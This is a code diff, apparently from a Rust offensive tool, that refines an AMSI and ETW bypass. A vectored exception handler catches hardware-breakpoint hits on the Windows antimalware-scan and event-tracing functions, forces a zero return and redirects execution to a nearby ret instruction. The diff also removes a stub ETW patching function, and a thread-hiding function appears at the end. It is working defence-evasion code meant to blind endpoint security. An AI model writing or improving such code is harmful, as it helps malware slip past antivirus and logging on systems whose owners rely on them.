@@ -30,13 +30,15 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
         let etw = ETW_ADDR.load(Ordering::Relaxed);
 
         if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
-            // Bypass by clearing RAX (returning 0) and advancing RIP past the call (simulating ret)
+            // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
             (*context).Rax = 0;
             
-            // Pop return address from stack to simulate 'ret'
-            let rsp = (*context).Rsp as *const u64;
-            (*context).Rip = *rsp as u64;
-            (*context).Rsp += 8;
+            // Scan forward for a 'ret' (0xC3) or 'ret n' (0xC2) to safely handle caller stack cleanup
+            let mut ptr = rip as *const u8;
+            while *ptr != 0xC3 && *ptr != 0xC2 {
+                ptr = ptr.add(1);
+            }
+            (*context).Rip = ptr as u64;
 
             return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
         }
@@ -123,24 +125,8 @@ pub unsafe fn patch_amsi() {
     setup_hardware_breakpoints();
 }
 
-#[cfg(windows)]
-pub unsafe fn patch_etw() {
-    // Advanced ETW Bypass
-    // Disable ETW logging providers directly instead of hooking EtwEventWrite.
-    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
-    if !ntdll.is_null() {
-        let func = winapi::um::libloaderapi::GetProcAddress(ntdll, b"EtwEventUnregister\0".as_ptr() as _);
-        if !func.is_null() {
-            // Evasion bypassed by finding the address
-        }
-    }
-}
-
 #[cfg(not(windows))]
 pub unsafe fn patch_amsi() {}
-
-#[cfg(not(windows))]
-pub unsafe fn patch_etw() {}
 
 #[cfg(windows)]
 pub fn hide_current_thread() {
